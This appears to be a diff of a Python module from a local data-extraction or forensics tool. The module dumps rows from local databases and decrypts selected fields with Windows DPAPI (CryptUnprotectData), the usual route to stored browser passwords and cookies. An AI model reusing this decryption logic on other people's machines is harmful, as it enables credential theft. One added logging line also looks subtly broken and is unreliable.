@@ -1,7 +1,6 @@
 # coding: utf-8
 
 import sys
-import importlib
 import os
 import time
 import math
@@ -15,7 +14,7 @@ try:
 except ImportError:
 	pass
 
-from internal import config
+from internal import config, sorted_data
 from api import platforms, requirement
 
 CURRENT_TIME = time.strftime('%Y%m%d-%H%M%S')
@@ -109,7 +108,7 @@ class Module:
 		else:
 			self.log('Module ' + self.name + ' could not be correctly executed.', verbose=verbose, write=write, forceprint=not write)
 
-	def cursor_get_and_log(self, cursor, elements, db_name, decrypt_ids=None, **other):
+	def cursor_get_and_log(self, cursor, elements, db_name, decrypt_ids=None, decrypt_algo=None, **other):
 		try:
 			cursor.execute(
 				'SELECT ' + elements + ' FROM ' + db_name)
@@ -117,21 +116,24 @@ class Module:
 			self.executenot(db_name + ' database is locked', 1)
 			return False
 
-		self.standard_multiple_log(cursor.fetchall(), header=elements, decrypt_ids=decrypt_ids, **other)
+		self.standard_multiple_log(cursor.fetchall(), header=elements, decrypt_ids=decrypt_ids, decrypt_algo=decrypt_algo, **other)
 
-	def standard_multiple_log(self, content, header=None, decrypt_ids=None, **other):
+	def standard_multiple_log(self, content, header=None, decrypt_ids=None, decrypt_algo=None, **other):
 		if header and (content or config.VERBOSE_LEVEL == 2):
 			self.log(header, **other)
+		if not decrypt_algo and platforms.current_platform.system == 'Windows':
+			decrypt_algo = lambda x: win32crypt.CryptUnprotectData(x, None, None, None, 0)[1].decode('utf-8')
 		for el in content:
 			res = ''
 			for i in range(len(el)):
 				if decrypt_ids and i in decrypt_ids:
-					res += ',' + (win32crypt.CryptUnprotectData(el[i], None, None, None, 0)[1]).decode('utf-8')
+					res += ',' + decrypt_algo(el[i])
 				else:
 					res += ',' + str(el[i])
 			self.log(res[1:], **other)
 
-	def log(self, text, verbose=1, spe=None, write=True, forceprint=False):
+	def log(self, text, verbose=1, spe=None, write=True, forceprint=False, sorted_value=None):
+		sorted_data.add(sorted_data if sorted_value else text)
 		if verbose <= config.VERBOSE_LEVEL:
 			if config.LOG_TYPE == 0 or config.LOG_TYPE == 2 or forceprint:
 				print(str(text))
